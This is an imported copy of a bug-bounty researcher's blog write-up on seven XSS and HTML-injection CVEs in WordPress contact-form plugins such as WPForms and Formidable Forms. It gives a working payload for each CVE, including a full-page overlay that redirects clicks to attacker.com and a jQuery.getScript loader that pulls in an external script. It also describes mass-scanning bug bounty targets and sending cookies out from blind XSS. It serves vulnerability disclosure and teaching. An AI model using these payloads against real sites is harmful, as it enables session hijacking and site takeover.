---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-02_the-dark-side-of-contact-forms-how-i-identified-7-cves-in-wordpress-plugins.md
original_filename: 2024-07-02_the-dark-side-of-contact-forms-how-i-identified-7-cves-in-wordpress-plugins.md
title: 'The Dark Side of Contact Forms: How I Identified 7 CVEs in WordPress Plugins'
category: documents
detected_topics:
- xss
- automation-abuse
- sso
- access-control
- command-injection
- mobile-security
tags:
- imported
- documents
- xss
- automation-abuse
- sso
- access-control
- command-injection
- mobile-security
language: en
raw_sha256: 51b8d0a7dd7b743f51d1b164032bd269e90a9e2fb529025ec61e7e9183494053
text_sha256: 1df09426e57557c4f3631ce5cfaaf105a4014e82eb497f4a0d14c2b30ff766a5
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: false
---

# The Dark Side of Contact Forms: How I Identified 7 CVEs in WordPress Plugins

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-02_the-dark-side-of-contact-forms-how-i-identified-7-cves-in-wordpress-plugins.md
- Source Type: markdown
- Detected Topics: xss, automation-abuse, sso, access-control, command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: False
- Raw SHA256: `51b8d0a7dd7b743f51d1b164032bd269e90a9e2fb529025ec61e7e9183494053`
- Text SHA256: `1df09426e57557c4f3631ce5cfaaf105a4014e82eb497f4a0d14c2b30ff766a5`


## Content

---
title: "The Dark Side of Contact Forms: How I Identified 7 CVEs in WordPress Plugins"
url: "https://blog.paniago.io/the-dark-side-of-contact-forms-how-i-identified-7-cves-in-wordpress-plugins-30f6111dfebf"
authors: ["Pedro Paniago (@dropn0w)"]
programs: ["Wordfence"]
bugs: ["Blind XSS", "Stored XSS", "HTML injection"]
bounty: "2,500"
publication_date: "2024-07-02"
added_date: "2024-07-08"
source: "pentester.land/writeups.json"
original_index: 205
scraped_via: "browseros"
---

# The Dark Side of Contact Forms: How I Identified 7 CVEs in WordPress Plugins

The Dark Side of Contact Forms: How I Identified 7 CVEs in WordPress Plugins
drop
Follow
14 min read
·
Jul 2, 2024

30

1

Press enter or click to view image in full size

Today, I am publishing the security research project I recently conducted. This project led to the discovery of 7 CVEs, which affected over 7 million WordPress websites.

In December 2023, I took on a challenge to discover at least one CVE in the WordPress core, plugin, or theme. This motivation came partly from the fact that I wanted to have my first CVE, and also because Wordfence was running a special bug bounty program for several days during that month.

As it was my first time undertaking such research, I wasn’t exactly sure where to start or what to focus on. Initially, I targeted plugins with over 50,000 installations that hadn’t been updated recently. My reasoning was that if they weren’t frequently updated, they might be weak regarding security. However, I was wrong on that point. In fact, the lack of frequent updates doesn’t necessarily mean the application is insecure. So, I needed to change my approach.

One type of research I find intriguing involves pre-authenticated vulnerabilities, similar to those that Assetnote identifies and publishes on their blog. Therefore, pre-authenticated, or unauthenticated attacks if you prefer, became my starting point. I needed to think about the types of vulnerabilities in a WordPress context that could present as unauthenticated.

Immediately, I recalled some Capture The Flag (CTF) challenges I solved, which involved WordPress. To solve these CTFs, I needed access to the admin area to establish a reverse shell or web shell. However, gaining access to the admin area usually required obtaining admin cookies, which were often linked to cross-site scripting, more precisely, Blind Stored Cross-Site Scripting via a contact form.

Blind XSS has always intrigued me, but I haven’t taken the time to set everything up properly to conduct some tests. This presented a great opportunity to enhance my skills with this type of bug.

Furthermore, WordPress does not explicitly set HTTPOnly and Content Security Policy (CSP) headers by default, potentially simplifying my research on XSS vulnerabilities.

At that point, I had pinpointed the focus of my research:

“Focus on WordPress contact form plugins that allow an unauthenticated user to submit a form, and attempt to trigger a blind XSS.”

With that in mind, it was time to conduct some preliminary research. WordPress has a ton of plugins, and I didn’t have the luxury of time to examine them all. I was conducting this research in my spare time, and the Wordfence bug bounty incentive was available for a limited period. Essentially, I had just five days to identify and report any bug.

Aware of these time constraints, I needed to approach this efficiently. When installing WordPress plugins, you have access to the source code of the plugin or theme. However, conducting a source code review can be incredibly time-consuming. Given that I had a specific attack vector in mind, I decided to jump straight into dynamic analysis.

My initial approach was as follows:

List and identify the most well-known contact form plugins on WordPress.
Set up my lab environment.
Install and test the forms in my lab environment to identify potential blind injections.
Report any discovered vulnerabilities.

For each plugin, I executed a similar test: I installed the plugin, created a new contact form, embedded it into a page or post, and then tested it as an unauthenticated user to see if I could inject code upon submitting the form. As mentioned earlier, the objective was to achieve a stored XSS to access the admin session.

During this process, I identified three types of vulnerabilities: Authenticated Stored XSS, Unauthenticated Blind HTML Injection, and Unauthenticated Blind XSS.

At the end of the 5th day, I identified the following vulnerabilities:

CVE-2023–6828 | ARForms <= 1.5.8 — Unauthenticated Stored Cross-Site Scripting
CVE-2023–6842 | Formidable Forms <= 6.7 — Authenticated (Administrator+) Stored Cross-Site Scripting
CVE-2023–6830 | Formidable Forms <= 6.7 — Unauthenticated HTML Injection
CVE-2023–7063 | WPForms Pro 1.8.4–1.8.5.3 — Unauthenticated Stored Cross-Site Scripting
CVE-2023–6953 | PDF Generator For Fluent Forms <= 1.1.7 — Authenticated Stored Cross-Site Scripting
CVE-2023–6957 | Fluent Forms <= 5.1.9 — Authenticated (Contributor+) Stored Cross-Site Scripting
CVE-2024–0386 | weForms <= 1.6.21 — Unauthenticated Stored Cross-Site Scripting

Here are the current installation numbers for the plugins impacted by this research:

WPForms: 6+ million => https://wordpress.org/plugins/wpforms-lite/
Formidable Forms: 400,000+ => https://wordpress.org/plugins/formidable/
Fluent Forms: 400,000+ => https://wordpress.org/plugins/fluentform/
weForms: 20,000+ => https://wordpress.org/plugins/weforms/
ARForms: 3,000+ => https://wordpress.org/plugins/arforms-form-builder/

Combining all these plugins, we’re talking about an impact on more than 7 million websites.

In my opinion, this was the easiest part. Having a CVE is great, but finding vulnerabilities in real targets is far more thrilling. This was my next challenge.

I needed to turn to public bug bounty programs to find targets to exploit these vulnerabilities. If you know me, you know I participate in private and public bug bounty programs. However, my approach to hunting isn’t heavily reliant on reconnaissance and automation. Instead, I prefer to delve deeply into the application's functionalities and try to uncover bugs in that manner.

Indeed, having those CVEs meant that I didn’t need to find the bug again, but rather, I needed to identify the targets impacted by those vulnerabilities.

At this stage, I had two options:

Doing the whole reconnaissance myself
Asking someone for help who already has an automated process for this.

As I want to improve several aspects of my reconnaissance skills, I first tried automating everything myself. To accomplish this, I did the following.

Step 1: First, I needed to gather all the domains and subdomains associated with public bug bounty programs from popular platforms like HackerOne, Bugcrowd, Intigriti, YesWeHack, and others. You can gather this information in different ways: Platform API, github repositories, subfinder, etc.

Step 2: Next, I had to probe these domains and subdomains to identify which ones were running WordPress. To accomplish it, I used httpx (https://github.com/projectdiscovery/httpx) from Project Discovery.

Step 3: With the list of identified domains, I needed to find out which ones were using WordPress and if they had the affected plugin installed. For those that did, I then had to verify whether they were using the vulnerable versions of the plugin. To achieve this, I used a custom nuclei (https://github.com/projectdiscovery/nuclei) template that I created.

Step 4: If a website was running an impacted version, I had to execute another automation process to crawl all the pages and find all the forms locations, based on the indicators I had identified previously. This automation could be easily performed with katana (https://github.com/projectdiscovery/katana).

Excellent. At that point, I had a list of targets that met all criteria: they had the plugin installed, it was an outdated version, and there were some accessible contact forms. These are precisely the conditions needed to send my payloads.

Then came another challenge. So far, during my tests, I could see the injection because I was logged in as an admin. In real-world scenarios, I wouldn’t have this visibility. Therefore, I needed a system to collect data from the blind injection.

Initially, I explored XSS Hunter. After installing it on a VPS and conducting some tests, it seemed to work quite well for basic tests.

From now on the focus of this writeup will be the CVE-2023–7063. Indeed, it’s impacting more than 6 million websites built in WordPress on its own.

However, I encountered the biggest challenge of my research. The payload provided by XSS Hunter was far too large. Consequently, I had to think outside the box.

So far, my tests had only involved using simple payloads like alert(document.domain), but for XSS Hunter, it was necessary to call an external JavaScript to extract some information required to prove the impact in my future bug bounty reports.

I experimented with multiple methods to reduce the payload size as much as possible. From the initial payload, I reduced the number of characters by two. However, it was still too large for the intended injection location, which had a maximum character limit of 65.

I almost gave up exploiting this bug. I thought:

“Great, I’ve found a major bug in a popular plugin, but I can’t exploit it correctly.”

Then, I decided to reach out to Justin Gardner (Rhynorater). He probably knew some tricks I didn’t. Like a light at the end of the tunnel, he suggested using jQuery to call an external JavaScript. As if by magic, it worked, and I had a perfect payload that fit where I needed it to fit.

With the correct payload in hand, I attempted to inject it and waited for the callback on my XSS Hunter server. But you guessed it; there was a new problem…

I could see some interactions with XSS Hunter in the server logs, but it wasn’t capturing any information. The issue wasn’t with XSS Hunter, as it worked correctly when used in another location. The problem arose when it was executing in the location where the payload was triggering.

I attempted to host a basic JavaScript file with the alert(1) command only to confirm that it triggered it correctly, and it did without any issues. Therefore, the problem wasn’t with the payload but with the information that XSS Hunter was trying to extract.

I tried a bit to debug XSS Hunter, but it took too long. Recognizing this issue, I realized that it would be more efficient if I created my own script and system to extract the necessary information needed to put in my future reports.

Whilst analyzing the standard output from XSS Hunter, I identified the following information: cookies, IP address, date, and URL path.

To provide a more comprehensive report, I believe it would be a great idea to include the name of the contact form. With this additional information, I could demonstrate the impact of the Cross-Site Scripting effectively and thus showcase that, through my exploit, I had complete control over the victim’s session.

I created a basic JavaScript file and a PHP script to exfiltrate, parse, and save the data in the desired format.

By then, everything was functioning as intended, but something was bothering me. Since it’s a blind injection, I had no idea when it would be triggered. I didn’t want to manually check my output file daily to see if there were new entries. So, I created a small Python script that continuously monitored the output file for new entries. If a new entry were detected, it would then send me a notification on Telegram. With this automation in place, I knew I had everything configured to exploit this vulnerability effectively.

A few paragraphs above, I described how I automated the recon process myself. This was my first method of finding targets with the impacted CVEs. The second method I applied was reaching out to my network.

For this, I reached out to Justin. He connected me with Nagli, who has an excellent automation system. Since I had already created the full automation on my end, all I needed from Nagli was potential new targets. I shared my Nuclei template with him, which he could run to identify targets and then provide them to me.

This approach was beneficial. Although it meant sharing the bounties, it was fair since they helped me identify additional targets that my own reconnaissance automation couldn’t access. This collab resulted in a $2,500 bounty.

The process of finding the 0day, reporting, patching, and implementing the system to capture the correct information from the blind injection took around four weeks.

Get drop’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Here is the summary of the whole process:

Defined the scope of my research.
Compiled a shortlist of plugins to test.
Conducted hands-on testing.
Reported findings to Wordfence for validation and CVE assignment.
Waited for the vendor to patch the bug.
Established a scalable reconnaissance system to identify affected targets.
Implemented a platform to capture information from blind injections.
Once authorized, send the payload to vulnerable systems.
Reported findings to bug bounty platforms.

To conclude, here are the PoC for each one of the CVEs identified during this research:

CVE-2023–6828 — ARForms <= 1.5.8 — Unauthenticated Blind Stored Cross-Site Scripting

ARForms = 1.5.8 is susceptible to an unauthenticated blind-stored Cross-Site Scripting (XSS) vulnerability. This issue arises when an attacker injects malicious JavaScript code into the arf_http_referrer_url parameter in a POST request during form submission.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/arforms-form-builder/arforms-158-unauthenticated-stored-cross-site-scripting-via-arf-http-referrer-url

Payload:

<script>alert(document.domain)</script>
CVE-2023–6842 — Formidable Forms <= 6.7 — Authenticated (Administrator+) Stored Cross-Site Scripting

There is a stored XSS in the Formidable Forms <= 6.7 in WordPress Plugin. When creating a form, any authenticated user (administrator, or editor, author, contributor or subscriber who the admin granted permission to edit forms) could adapt the Field Label and Field Description.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/formidable/formidable-forms-67-authenticated-administrator-stored-cross-site-scripting

The attacker could inject the following payload on one of those fields:

<img/src/onerror=alert(document.domain)>

The stored XSS can be triggered in three ways (three different sinks according to the user role who injected the malicious code):

1 — Form edition: when the victim clicks on the Field to adapt, and then clicks on the Field Label, the XSS triggers. (All user levels can perform this attack)

2 — When the victim goes to the Styles area, the XSS triggers without any user interaction (Only when an administrator or editor injects the payload).

3 — When the form is used in a Post or Page. (Only when an administrator or editor injects the payload).

Note 1: Field Label -> To trigger a stored XSS, subscribers, contributors, or authors (as attackers) need to use the following payload due to the data validation and sanitization that happens for those user permissions.

<img/s<script>rc<script>/oner<script>ror=prompt(8)>

Note 2: Field Description -> subscriber, contributor or author users cannot inject the previous payload into the Field Description.

Note 3: Even if low-level users (author, contributor or subscriber) have some constraints to inject JavaScript code, they can inject any HTML code into those fields and the data validation and sanitization won’t remove it.

CVE-2023–6830 — Formidable Forms <= 6.7 — Unauthenticated HTML Injection

The Formidable Forms plugin <= 6.7 is found to be susceptible to HTML injection attacks. This vulnerability allows unauthenticated users to inject arbitrary HTML code into form fields. When the form data is viewed by an administrator in the Entries View Page, the injected HTML code is rendered, potentially leading to website defacement or redirection to malicious websites.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/formidable/formidable-forms-67-html-injection

Payload to perform an open redirect:

<a href="http://attacker.com" style="display: block; z-index: 100000; opacity: 0.5; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;"> </a>
Press enter or click to view image in full size
Press enter or click to view image in full size
Press enter or click to view image in full size

As soon as the victim clicks anywhere on the red screen, they are redirected to our controlled website. Of course, in a real scenario, the attacker wouldn’t use a red background.😅

CVE-2023–7063 — WPForms Pro 1.8.4–1.8.5.3 — Unauthenticated Stored Cross-Site Scripting

WPForms (version 1.8.5.3) is susceptible to a critical security vulnerability. This vulnerability allows unauthenticated users to perform a Unauthenticated Blind Stored Cross-Site Scripting (XSS) attack. The issue arises when an attacker submits a form containing malicious HTML code. This injected code remains dormant until a privileged user, such as an administrator, editor, author, or contributor, accesses the Entries page of the form. Upon opening the Entries page for the affected form, the stored XSS payload is executed, potentially leading to unauthorized actions being performed or sensitive data being compromised.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpforms/wpforms-pro-1853-unauthenticated-stored-cross-site-scripting-via-form-submission

Payload (of PoC): <img/src=x onerror=”alert(1)

<img/src=x onerror="alert(1)

Payload to load an external JavaScript file:

<svg/onload="jQuery.getScript('https://xx.xx')

Injecting Payload:

Press enter or click to view image in full size

As soon as the victim clicks on “Entries” to view all entries, or to view the entries of a specific form, the dormant XSS will be triggered on the preview page.

Press enter or click to view image in full size

Preview page:

Press enter or click to view image in full size
Press enter or click to view image in full size
Press enter or click to view image in full size
CVE-2023–6953 — PDF Generator For Fluent Forms <= 1.1.7 — Authenticated Stored Cross-Site Scripting

The Fluent Forms WordPress plugin (<= 5.1.5) contains a Stored Cross-Site Scripting (XSS) vulnerability within its PDF Feed feature. This vulnerability is present in the “Settings & Integration” area of the plugin. Users with authorization to create forms, such as those with ‘author’, ‘contributor’ or ‘editor’ privileges, can exploit this vulnerability. The attack vector involves injecting malicious JavaScript payloads into various text fields while editing a PDF Feed. The fields susceptible to this injection are the Header Content, PDF Body Content and Footer Content. When another user, such as an administrator, opens the affected PDF Feed for editing, the malicious script is executed, leading to the Stored XSS condition.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fluentforms-pdf/pdf-generator-for-fluent-forms-117-cross-site-scripting

Payload Used:

<EMBED SRC="data:image/svg+xml;base64, PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD48L3N2Zz4=" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
CVE-2023–6957 — Fluent Forms <= 5.1.9 — Authenticated (Contributor+) Stored Cross-Site Scripting

Fluent Forms WordPress Plugin version 5.1.5 has been identified as being vulnerable to stored cross-site scripting (XSS). The vulnerability arises due to inadequate sanitization of user inputs in the “Custom HTML” field. This security flaw allows users with specific roles (Administrator, Editor, Author, Contributor) and sufficient permissions to inject malicious JavaScript code. The injected script is executed when a victim accesses the malicious form, leading to a potential compromise of session information or other malicious activities.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fluentform/fluent-forms-519-authenticated-contributor-stored-cross-site-scripting

Vulnerable Location: Fluent Forms Plugin > Custom HTML Field

Vulnerable Parameter: Text option in HTML Code Editor

Payload:

<iframe srcdoc='&lt;body onload=prompt&lpar;document.domain&rpar;&gt;'>
CVE-2024–0386 — weForms <= 1.6.21 — Unauthenticated Stored Cross-Site Scripting

The WordPress plugin ‘weForms’ is found to be vulnerable to an Unauthenticated Stored Cross-Site Scripting (XSS) attack. This vulnerability arises when an attacker submits the contact form and maliciously modifies the ‘Referer’ HTTP header. Instead of a legitimate referer URL, the attacker injects a JavaScript payload, such as “javascript:alert(1)”. This payload is then stored in the backend. When an admin views the entry and clicks on the referer URL, the injected script is executed, leading to the Stored XSS attack. This vulnerability allows the attacker to perform blind XSS injections without authentication.

Reference: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/weforms/weforms-1621-unauthenticated-stored-cross-site-scripting-via-referer

Payload used in the HTTP header Referer when submitting a form:

javascript:alert(1)

I hope you enjoyed this write-up. My main goal was to explain the entire process of 0-day research rather than just the bug itself. I strongly believe this could be helpful for those new to security research.

Feel free to contact me with any questions. You can find me on Twitter or LinkedIn.

Twitter: @dropn0w

LinkedIn: Pedro Paniago

Keep learning, keep hacking!
